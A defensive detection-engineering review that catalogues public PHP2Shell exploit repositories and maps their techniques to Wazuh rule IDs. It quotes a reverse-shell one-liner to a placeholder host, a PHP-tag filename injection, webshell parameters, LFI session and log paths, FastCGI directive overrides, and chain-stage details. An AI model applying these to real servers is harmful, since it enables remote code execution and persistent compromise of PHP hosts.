# PHP2Shell exploit corpus: types, chains, and detection rules

Reviewed 2026-10-30. The corpus covers the fourteen sources named in the task
and five related repositories found through a GitHub repository search. Rule
IDs refer to `existing_rules.xml`.

Each repository section lists the techniques, then the rule IDs that react to
them. The later tables group the same material by exploit type and by gap.

The review used the repository source. Several clients send raw sockets, so
user-agent rules miss them. The rules look at request shape, PHP runtime
messages, worker failures, dropped files, process records, and fixed strings
that the public clients leave behind.

## Corpus by repository

### aancw/php2shell-scanner (Go, passive and host check)

| Type | Technique |
|---|---|
| Fingerprint | Reads `X-Powered-By: PHP/x.y.z`, otherwise parses a `phpinfo()` page |
| Path enumeration | Probes `index.php`, `info.php`, `phpinfo.php`, `test.php`, `pi.php`, `i.php`, `php.php`, `status.php`, `phpversion.php`, `version.php` |
| Config triage | Reads `session.upload_progress.enabled`, `session.save_path`, `memory_limit`, `display_errors`, `session.serialize_handler`, `fatal_error_backtraces`, `post_max_size` |
| Arming probe | 1 KB multipart POST with `PHPSESSID`, `PHP_SESSION_UPLOAD_PROGRESS`, and `file1`, no cookie; a `Set-Cookie: PHPSESSID` answer means upload progress is on |
| Host check | SSH or local scan for session files containing `upload_progress_`, config directives, and poisoned session records |
| Handler mismatch | Reads `Failed to decode session object` to flag two apps sharing a save path with different handlers |

Rules: 111105, 111106, 111121, 111122, 111012, 111126. Host-side file checks
are outside Wazuh unless the host check writes to a log that Wazuh reads.

### JoasASantos/php2shell-exploit (five chains)

| Type | Technique |
|---|---|
| v1, code exec | Fake `HashTable` whose `pDestructor` is `zif_system`; one worker crash per command |
| v2 htaccess | `system()` writes `.htaccess` with `php_value auto_prepend_file "/tmp/.p2s_v2.php"`, then drops the webshell |
| v2 gadget | Writes `PG(auto_prepend_file)` in BSS through `lxb_css_selector_list_remove`; no `.htaccess` |
| v2 zero | Session-file carrier plus the BSS write; no file in the web root |
| v2 grooming | Keep-alive pipeline on one pinned worker; no crashes |
| OOM body | 860 parts, field names nested 64 levels with 90 bytes of padding, boundary `C` x 10 |
| Post-exploit | Webshell prints `<<<P2S>>>` around output; reverse shell through bash, python, perl, nc, or php |

Rules: 111126, 111125, 111134, 111131, 111132, 111002, 111117, 111118,
111120.

### aarsaputra/php2shell (Indonesian documentation, detection, and chain)

| Type | Technique |
|---|---|
| Detection | Version verdict per branch, `display_errors` probe, `upload_progress` probe through `Set-Cookie`, handler-mismatch probe |
| Chain | Worker rotate, heap leak, `libphp` leak, fake `HashTable`; fixed SID `attacksessionid0001`; `id>/out/p1` |
| Calibration | Reports RCE, leak-only, or no-result per PHP build and architecture |
| CVE-2026-115560 | Trickle multipart with `PHP_SESSION_UPLOAD_PROGRESS` set to a pipe character plus a serialized `LabGadget`; a consumer page calls `session_start()` and the gadget writes output to `p/R.txt` |
| Shell tooling | `upshell_live.py`, `safe_shell.py`, `web_shell_gen.py` generate interactive and web shells |

Rules: 111105, 111121, 111122, 111013, 111100, 111131, 111144, 111145,
111149, 111152. The CVE-2026-115560 producer is covered by 111145, and the
multipart INI field by 111152.

### eness/php2shell-CVE-2026-109618-CVE-2026-109619-PoC

| Type | Technique |
|---|---|
| Stage 0 | Abort the current prefork worker so the next child starts with a clean heap |
| Stage 1 | OOM with a 12 MB multipart field; uninitialized memory leaks through `Set-Cookie: PHPSESSID` (Zend MM chunk base) |
| Stage 2 | Serialization alignment leaks `ZVAL_PTR_DTOR`, giving the `libphp` base |
| Stage 3 | 167-byte `zend_string` carries a fake `HashTable` with `pDestructor` set to `zif_system` |
| Command limit | Commands are limited to 14 bytes, so longer ones chain through `sh</tmp/c` |
| Offsets | Profile presets, or `docker/offsets.py` against a local container |

Rules: 111002, 111112, 111013, 111132, 111118, 111130, 111144.

### ZeroHackOrg/php2shell-poc

| Type | Technique |
|---|---|
| Trigger | Multipart POST with `PHP_SESSION_UPLOAD_PROGRESS` and a stalled file part (1.5 s) |
| Grooming | 50 rounds of nested multipart writes, progress value `g0` to `g49` |
| Client disguise | Boundary `----WebKitFormBoundary` plus 16 hex characters |
| Reverse shell | `bash -i >& /dev/tcp/<ip>/<port> 0>&1`, with `sh` fallback |
| Persistence | Drops `pwn.php`, a webshell gated on `auth_pass` with a `cmd` parameter |
| File output | Webshell and reverse-shell payloads are also sent as multipart file content |

Rules: 111121, 111131, 111132, 111120, 111111, 111151, 111118.

### dimasma0305/php2shell

| Type | Technique |
|---|---|
| Passive scan | HEAD and GET only; correlates version, runtime identity, fingerprints, cookies, and visible upload surfaces |
| Exploit client | Requires exact PHP 8.4.26 build, prefork `mod_php`, keep-alive, upload progress, and a calibrated request near 140 MiB |
| Targets | Six RCE-verified lab apps: WordPress, MediaWiki, DokuWiki, Joomla, plain PHP, CodeIgniter |
| Defense | Suricata SID 9000618 on boundary `S` x 17 plus `PHP_SESSION_UPLOAD_PROGRESS`; the lab documents a benign upload that triggered it |

Rules: 111123, 111121, 111105, 111002.

### jf0x3f/php2shell-pocs

| Type | Technique |
|---|---|
| CVE-2026-109618 trigger | One multipart part with 80,000 headers forces memory exhaustion during parsing |
| CVE-2026-109619 trigger | PHP 8.5.4 with `fatal_error_backtraces=1`: a fatal-error producer followed by an `.htaccess` consumer leaves `zend_mm_heap corrupted` and a replaced worker |
| Producer | `fatal.php` calls `trigger_error('LOCAL_CVE_109619_PRODUCER_FATAL', E_USER_ERROR)` |
| Consumer | `.htaccess` sets `php_value auto_detect_line_endings 1` |
| ASLR lab | Wraps the 9bie client against PHP 8.4.26 |

Rules: 111002, 111013, 111116, 111117, 111141. The 80,000-header request
reaches the OOM rules; there is no separate header-count rule.

### 9bie/php2shell-bypass-aslr-exp

| Type | Technique |
|---|---|
| Preconditions | `display_errors=Off`, `memory_limit=128M`, stock 150-worker prefork |
| Worker pinning | Holds 149 workers with unfinished requests so A1, B1, A2, and B2 land on the same child |
| A1 | OOM at end-of-request cleanup with the `Set-Cookie` path still open |
| B1 | Stale-id out-of-bounds read leaks the chunk base and `zval_ptr_dtor`, then the `libphp` base |
| A2/B2 | Main chunk chosen from the leak, then the fake `HashTable` and `zif_system` |
| Transport | Chunked bodies and junk query pairs `q0000000` to `q0000004` |
| Body | Boundary `C` x 10, PHPSESSID field, progress field, nested empty file fields |

Rules: 111013, 111100, 111132, 111002, 111001, 111128, 111130, 111126.

### adriyansyah-mf/php2shell-bookworm

| Type | Technique |
|---|---|
| Save-path probe | Tests 4-character paths with `. /tmp/sess_`, `. /run/sess_`, `. /var/sess_` bootstrap prefixes |
| SID probes | Single NUL byte, 19 `a` characters, and 32 `a` characters in the `PHPSESSID` field |
| OOM ramp | Retries at 12, 24, 32, 48, 64, 96, 128, 160, 192, 256, 320, 384, and 512 MB |
| Carrier | Same 167-byte string as the reference PoC, with a 14-byte command limit |
| Output | `id>/out/p1`, with long commands split through a short bootstrap |
| Boundary | `BNDRY12345` for the leak and trigger requests |

Rules: 111002, 111009, 111121, 111122, 111144, 111118, 111126, 111149.

### Ademking/php2shell-nuclei-templates (four templates)

| Type | Technique |
|---|---|
| Session fixation | `PHPSESSID` sent as a multipart field with an invalid id, plus `PHP_SESSION_UPLOAD_PROGRESS`; matches the PHP startup warnings |
| Version check | `X-Powered-By` compared against the fixed releases; no exploit traffic |
| Handler mismatch | Writes `x`, a pipe, then `O:8:"stdClass":0:{}` into the upload filename under `php_serialize`, reads the session back through a `php`-handler endpoint, matches the decode failure |
| Session injection to LFI | Filename holds `<?php echo marker; ?>`, then GET `lfi_path` plus `/tmp/sessions/sess_<sid>`; needs `cleanup=Off` and `use_strict_mode=Off` |
| Boundary | `----Nuclei<marker>`, `----NucleiWrite<marker>`, `----NucleiRead<marker>` |
| Marker | `NUCLEI` plus a random base string in the filename and the response match |

Rules: 111122, 111124, 111012, 111121, 111009, 111010, 111105, 111108,
111126, 111145.

### ikow/php2shell-poc (five chains plus a detection pack)

| Type | Technique |
|---|---|
| Chain A | PHP code in the upload filename, then include `/tmp/sessions/sess_<sid>` through any LFI sink |
| Chain B | `var_destroy` UAF; finds `zif_system` through `EG()`, overwrites the `var_dump` handler through `/proc/self/mem`; needs an `unserialize()` sink and leaves no network signature |
| Chain C | Pollutes the FPM worker `PS(serializer)`, injects a serialized object through the filename, `__destruct` runs when decoding fails |
| Chain D | OOM leaves stale `EG()` on `mod_php`; no application precondition |
| Chain E | FPM session OOM leaves stale `BG()`: producer is any `session_start()` endpoint, consumer is any endpoint that then answers 502 |
| Detection pack | 12 Suricata and Snort rules, Sigma, ModSecurity v2 and v3, Lua; keys on chunked multipart, oversized filename, leaked cookie bytes, and session path in the URL |

Rules: 111122, 111124, 111108, 111012, 111002, 111112, 111013, 111101,
111128, 111129, 111130, 111146, 111153. Chain B has no HTTP signature, so
111146 is the only direct Wazuh coverage.

### syrex1013/php2shell (four delivery paths)

| Type | Technique |
|---|---|
| Session poison and LFI | PHP tag in the multipart filename, then include one of 14 probed `sess_<sid>` paths across Linux and Windows |
| Log poison | Payload in the User-Agent, then include `/var/log/apache2/access.log`, `/var/log/httpd/access_log`, `/var/log/nginx/access.log`, or a php-fpm log through the same LFI |
| FastCGI direct | Raw FastCGI to FPM with `PHP_ADMIN_VALUE: allow_url_include=On` and `auto_prepend_file=<sess file>`; no HTTP request, so no web log |
| PEAR webshell | `auto_prepend_file` pointed at `pearcmd.php`, then a command writes a webshell into the web root |
| Trigger modes | `destroy`, `regenerate`, `gc`, `double`, `abort`; stalls the upload past `session.upload_progress.min_freq` |
| Boundary | `----php2shellBoundary` plus 8 hex characters |

Rules: 111124, 111108, 111109, 111110, 111125, 111009, 111010, 111147,
111148, 111152. The FastCGI path has no web log; it needs a network sensor or
an FPM request log that Wazuh reads.

### projectdiscovery/nuclei-templates (CVE-2026-109618)

| Type | Technique |
|---|---|
| Active crash probe | Three OOM bodies: 1 MB with 4000 parts, 8 MB with 1020 parts, and 20 MB with 1020 parts |
| Body shape | Field name is `a` followed by a 62-deep `[a]` chain and an empty `filename`; filler lines are `x:` |
| Boundary | Empty |
| Verdict | Response must contain `Allowed memory size of`, `bytes exhausted`, and `Unknown`; otherwise a version verdict applies, suppressed for distro builds |
| Control request | Sends a control request first and skips the probes when the control fails or is rejected |

Rules: 111127, 111002, 111112, 111105, 111153.

### 78ResearchLab/PHP2Shell-Full-Chain-Exploit

| Type | Technique |
|---|---|
| Transport | Raw sockets, no user agent; fixed SID `attacksessionid0001`; boundaries `S` x 17 and `B` x 10 |
| Rotate | 1001 short parts plus a 12 MB field and a NUL session id; then a `BNDRY12345` request with the fixed SID |
| Stage 1 | 1001 filler parts and a 12 MB OOM field; reads the leaked chunk base from `Set-Cookie: PHPSESSID` |
| Stage 2 | 892 fillers, a forged value at a chosen window, and 150 `aNNNN[0]` parts; leaks the `libphp` base through `ZVAL_PTR_DTOR` |
| Stage 3 | Fake `HashTable` with `pDestructor` set to `zif_system`; 400 spray parts of 4071 bytes, each starting `SPRAY%03d` |
| Reclaim sweep | Brute-forces `r0` across pages `0x50000` to `0xC0000` with four low-bit values |
| Oracle | `--sleep-oracle` runs `sleep 5`; `--fetch` runs `id>/var/www/html/pwn.txt` and reads `/pwn.txt` |
| Command limit | 256 bytes |

Rules: 111144, 111150, 111126, 111002, 111112, 111013, 111130, 111149,
111131, 111011, 111101. The client's own detection guide ships only Snort and
Suricata rules for the progress field; the Wazuh rules above add the file,
process, and marker coverage.

## Related projects

These sources added request shapes and fixed strings that the rules now cover;
none added a new exploit primitive.

| Source | Contribution | Rules |
|---|---|---|
| assetnote/php2shell-scanner | Active crash scanner with an empty boundary, 1/8/20 MiB probes, 4000/1020/1020 parts, and a 62-deep `[a]` field chain | 111127, 111153, 111002, 111112 |
| devploit/php2shell | Launcher and offset profiles for the upstream chain; chunked multipart with `PHPSESSID` in a cookie and progress in the body | 111121, 111128, 111002 |
| murrez/php2shell | Full framework with LFI discovery, traversal paths, `PHP2SHELL_CHECK_OK`, `PHP2SHELL_CORE_`, `PHP2SHELL_CHAIN_OK`, multipart INI fields, `session.serialize_handler` modes, `/proc/self/fd`, `php_errors.log`, and `out/p1` output | 111150, 111152, 111145, 111004, 111109, 111149 |
| openai/php2shell-checker | Version checker using `HEAD`, then `GET` on 405 or 501; reads `X-Powered-By` and `Server`; sends no exploit probe | 111105 (recon only) |
| NCSC-NL/php2shell | Mitigation and inventory project with a cPanel script and software lists; no exploit client | None |

## Consolidated exploit types

| # | Exploit type | Technique | Rules |
|---|---|---|---|
| 1 | Fingerprinting | Version header, `phpinfo`, config disclosure, upload-progress confirmation | 111105, 111106 |
| 2 | Session fixation | `PHPSESSID` accepted from a multipart field instead of a cookie | 111122, 111009, 111144 |
| 3 | Session file injection | PHP code, a serialized object, or an inflated filename written into `sess_<id>` | 111124, 111010, 111129, 111145 |
| 4 | LFI to RCE | Include `sess_<id>`, a poisoned log, `/proc/self/fd`, or a PEAR script after injection | 111004, 111108, 111109, 111110, 111148 |
| 5 | Handler mismatch | `php_serialize` write, `php` read, destructor fires on decode failure | 111012, 111145, 111152 |
| 6 | OOM heap leak | Oversized, chunked, or deeply nested multipart body, ASLR base leaked in a cookie | 111002, 111112, 111127, 111005, 111007, 111128, 111130, 111153 |
| 7 | Worker control | Abort, rotate, or pin prefork children; a dying FPM worker answers 502 | 111011, 111099, 111013, 111100, 111101, 111102, 111103 |
| 8 | Fake dispatch | Forged `HashTable` or BSS write reaches `zif_system` or `auto_prepend_file` | 111013, 111141, 111146 |
| 9 | Persistence | `.htaccess`, `.user.ini`, webshell in `/tmp` or the web root, output files | 111117, 111118, 111119, 111120, 111149 |
| 10 | Post-exploit | Reverse shell, downloads, command output to a file, webshell requests | 111111, 111131, 111132, 111133, 111147, 111151 |
| 11 | Client fingerprints | Fixed SID, marker strings, boundary strings, empty boundary | 111123, 111126, 111144, 111150, 111153 |

Counter and duplicate rules (111102, 111103, 111143, 111114, 111115, 111104,
111142) raise the level when a row above repeats: 503 instead of 500, a crash
campaign, an edge rejection, or a 5xx follow-up to the probe.

## Sources disagree on the mechanism

The clients describe the bug differently. eness and Ademking describe a
use-after-free in the upload-progress handler (CWE-416) plus a session
fixation variant (CWE-384). projectdiscovery describes `longjmp()` on OOM
leaving uninitialized request memory. JoasASantos states that session
poisoning is not the mechanism. aarsaputra and murrez add
CVE-2026-115560, a serialize-handler mismatch that is a separate bug in the
same session code.

The rules target artifacts that all sources produce, so the disagreement does
not change the detection. Read the mechanism section of a source before
writing an incident report, and do not treat a session-file include as proof
of the OOM use-after-free.

## Gap analysis against the 53-rule set

The 53-rule set covered the main HTTP, PHP, kernel, FIM, and process artifacts.
The second pass found these gaps.

| Gap | Why it mattered | Change |
|---|---|---|
| Boundary strings | Public clients also use `B` x 10, `BNDRY12345`, `----php2shellBoundary`, `----Nuclei`, and an empty boundary | 111126 extended, 111153 added |
| Fixed session id | aarsaputra, bookworm, and 78ResearchLab reuse `attacksessionid0001` | 111144 added |
| Serialized progress value | CVE-2026-115560 places the `O:...` object in `PHP_SESSION_UPLOAD_PROGRESS`, not in the filename | 111145 added |
| INI directives as fields | murrez sends `session.serialize_handler`, `auto_prepend_file`, and `allow_url_include` as multipart field names | 111152 added, 111125 extended |
| PEAR path | syrex reaches `pearcmd.php` directly or through LFI | 111148 added |
| Webshell path | The access log can show a request to a dropped shell without `auth_pass` or `cmd` | 111147 added |
| Output files | 78ResearchLab writes `pwn.txt`; aarsaputra and bookworm write `out/p1` | 111149 added |
| `/proc/self/mem` | ikow chain B overwrites a function pointer without HTTP traffic | 111146 added |
| Cookie leak shape | Leaks can be percent-encoded or longer than a normal session id | 111130 extended |
| Session path forms | Custom save paths, Windows paths, and encoded slashes were missed | 111004 and 111108 extended |
| Log path forms | `httpd/access_log`, `php_errors.log`, and `/proc/self/fd` were missed | 111109 extended |
| Webshell extensions | `.phtml`, `.php5`, and `.pht` were missed | 111118, 111120, 111147 extended |
| Parameter order | `cmd` before `auth_pass` was missed | 111111 changed to two lookaheads |
| Network utilities | `nc` and `netcat` were missed | 111133 extended |

The overlap between 111111 and 111147 is deliberate: one matches the query
pair, the other matches the shell path. Wazuh raises one alert per event, so a
request that has both produces one alert, not two.

## Repository list

### Named sources

- https://github.com/aancw/php2shell-scanner
- https://github.com/JoasASantos/php2shell-exploit
- https://github.com/aarsaputra/php2shell
- https://github.com/eness/php2shell-CVE-2026-109618-CVE-2026-109619-PoC
- https://github.com/ZeroHackOrg/php2shell-poc
- https://github.com/dimasma0305/php2shell
- https://github.com/jf0x3f/php2shell-pocs
- https://github.com/9bie/php2shell-bypass-aslr-exp
- https://github.com/adriyansyah-mf/php2shell-bookworm
- https://github.com/Ademking/php2shell-nuclei-templates
- https://github.com/ikow/php2shell-poc
- https://github.com/syrex1013/php2shell
- https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2026/CVE-2026-109618.yaml
- https://github.com/78ResearchLab/PHP2Shell-Full-Chain-Exploit

### Related sources

- https://github.com/assetnote/php2shell-scanner
- https://github.com/devploit/php2shell
- https://github.com/murrez/php2shell
- https://github.com/openai/php2shell-checker
- https://github.com/NCSC-NL/php2shell
